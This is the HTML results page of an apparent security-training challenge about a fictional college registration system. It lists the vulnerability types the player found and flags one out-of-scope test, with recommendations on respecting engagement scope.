    @media (max-width: 600px) {
        .ascii-art pre {
            font-size: 0.55rem;
            line-height: 1;
        }
    }
    
    @media (max-width: 480px) {
        .blueprint {
            padding: 0.8rem;
        }
        
        .blueprint h3 {
            font-size: 1rem;
            margin-bottom: 0.6rem;
        }
        
        .ascii-art pre {
            font-size: 0.45rem;
            line-height: 0.9;
        }
    }
    
    @media (max-width: 320px) {
        .ascii-art pre {
            font-size: 0.4rem;
            transform: scale(0.8);
            transform-origin: center center;
        }
    }
</style>
    <link rel="stylesheet" href="/register/css/notification.css">
    <style>
        .mixed-banner {
            background: linear-gradient(to right, #f39c12, #d35400);
            padding: 1.5rem;
            border-radius: 8px;
            margin-bottom: .5rem;
            color: white;
            text-shadow: 1px 1px 3px rgba(0,0,0,0.5);
            text-align: center;
        }
        
        .mixed-icon {
            font-size: 4rem;
            margin-bottom: 1rem;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }
        
        .info-section {
            background: rgba(255,255,255,0.9);
            border-radius: 8px;
            padding: 2rem;
            margin-top: 2rem;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
        }
        
        .scope-violations {
            background-color: rgba(231, 76, 60, 0.1);
            border-left: 4px solid #e74c3c;
            padding: 1rem;
            margin: 1.5rem 0;
            border-radius: 0 4px 4px 0;
        }
        
        .good-findings {
            background-color: rgba(46, 204, 113, 0.1);
            border-left: 4px solid #2ecc71;
            padding: 1rem;
            margin: 1.5rem 0;
            border-radius: 0 4px 4px 0;
        }
        
        .recommendations {
            border-radius: 0 4px 4px 0;
        }
        
        .badge-section {
            background: rgba(255,255,255,0.9);
            border-radius: 8px;
            text-align: center;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
            font-size: 1rem;
            padding: .2rem;
        }
        
        .badge-icon {
            font-size: 4rem;
            margin-bottom: 1rem;
            color: #e67e22;
            text-shadow: 1px 1px 3px rgba(0,0,0,0.2);
        }
    </style>
</head>
<body>
    <!-- <div class="mini-gnome-container"></div>
<script>
(function() {
    if (window.gnomeVandalLoaded) return;
    window.gnomeVandalLoaded = true;
    
    document.addEventListener('DOMContentLoaded', function() {
        function getCookie(name) {
            var value = "; " + document.cookie;
            var parts = value.split("; " + name + "=");
            if (parts.length == 2) return parts.pop().split(";").shift();
        }

        if (getCookie('Schrodinger')) {
            var container = document.querySelector('.mini-gnome-container');
            if (container && !document.getElementById('mini-gnome')) {
                var img = document.createElement('img');
                img.src = '/gnomeU?id=d116a229-4021-45ff-a1bb-c6024a9e5850';
                img.id = 'mini-gnome';
                img.style.cssText = 'width: 20px;height: auto;position: fixed; left: 10px; bottom: 10px;';
                container.appendChild(img);
            }
        }
    });
})();
</script> -->
    <main id="elfStyle" style="padding: 1.5rem; width: 100%;">
        <!-- Include common animations -->
        <div id="snowflakes"></div>

<script src="/register/js/course_common.js"></script>
        
        <header>
            <p class="welcome" role="banner">📝 Neighborhood College Security Assessment Results 📝</p>
        </header>
        
        <section class="courses-content">
            <div class="courses-container">
                <div class="mixed-banner">
                    <div class="mixed-icon">⚠️</div>
                    <h1 style="font-size: 1.75rem;">Assessment Complete: Mixed Results</h1>
                    <p style="font-size: 1.25rem;">You've successfully identified a number of in-scope vulnerabilities but went beyond the defined scope by attempting to actively test out-of-scope resources.<br><br><label style="font-size: 1rem;">(Challenge not completed.)</label></p>
                </div>
                <div class="course-section" style="margin-bottom: .5rem;">
                    <h2>❄️ Assessment Overview</h2>
                    <p>Your security assessment of the Neighborhood College registration system has produced mixed results. While you demonstrated excellent technical ability by discovering a number of in-scope vulnerabilities, your methodology included actively testing areas that were explicitly defined as out-of-scope for this engagement.</p>
                </div>
                <div class="course-details">


                    <div class="course-section" style="background-color: rgba(46, 204, 113, 0.1); border-left: 4px solid #2ecc71; padding: 1rem;">
                        <h2>✅ Positive Findings</h2>
                        <p>You successfully identified <strong>6 vulnerabilities</strong> in the Neighborhood College registration system:</p>
                        <ul>
                            <li> Uncovered developer information disclosure.</li>
                            <li> Exploited Information Disclosure via login and additional X-Forwarded-For header</li>
                            <li> Found commented-out course search</li>
                            <li> Identified SQL injection vulnerability</li>
                            <li> Reported the unauthorized gnome course</li>
                            <li> Hidden course found via cookie prediction</li>
                        </ul>
                    </div>
                        
                    <div class="course-section" style="background-color: rgba(231, 76, 60, 0.1); border-left: 4px solid #e74c3c;">
                        <h2>❌ Scope Violations</h2>
                        <p>However, our system detected <strong></strong> attempts to test out-of-scope resources. In professional penetration testing, adhering to the defined scope is critical for:</p>
                        <ul>
                            <li>Maintaining legal protections for the tester</li>
                            <li>Respecting client boundaries</li>
                            <li>Preventing disruption to production systems</li>
                            <li>Ensuring testing focuses on priority areas</li>
                            <li>Building client trust</li>
                        </ul>
                        
                        <h2>Exploits Attempted</h2>
                        
                        <ul>
                            
                            <li>Attempting to use the out-of-scope Student Lookup functionality</li>
                            
                        </ul>
                        
                    </div>
                    
                    <div class="course-section" style="background-color: rgba(52, 152, 219, 0.1); border-left: 4px solid #3498db;">
                        <div class="recommendations">
                            <h2>💡 Recommendations</h2>
                            <p>For future security assessments:</p>
                            <ul>
                                <li>Carefully review and understand the engagement scope before beginning</li>
                                <li>Document target boundaries clearly</li>
                                <li>When uncertain about scope, seek clarification rather than proceeding</li>
                                <li>Maintain detailed logs of all testing activities</li>
                                <li>Focus on thorough testing within defined boundaries</li>
                            </ul>
                        </div>
                    </div>
                    <div class="badge-section">
                        <div class="badge-icon">🥈</div>
                        <h2>Skilled Security Tester Badge Awarded</h2>
                        <p>For your technical ability in finding all vulnerabilities, Neighborhood College recognizes you as a Skilled Security Tester. With improved scope discipline, you could achieve Master Security Tester status in future assessments.</p>
                    </div>
                </div>
            </div>
        </section>
        
        <!-- Common navigation and instructions section -->
<p class="violation"><a href="/">🏠 Return Home</a> | <a href="/register/reset">🔁 Reset Session</a> | <a href="/register/status_report">📋 View Status Report</a> | <a href="#" id="instBtn" aria-expanded="false" aria-controls="rules">📖 Instructions</a></p>
<div id="rules" class="rules" aria-hidden="true">    <img id="instructions" src="/register/images/instructions.png" alt="Instructions for the Registration System" style="max-height:100%;">
    <button id="closeInstructions" class="close-instructions" aria-label="Close Instructions">Close</button>
</div>
    </main>
</body>
</html>
```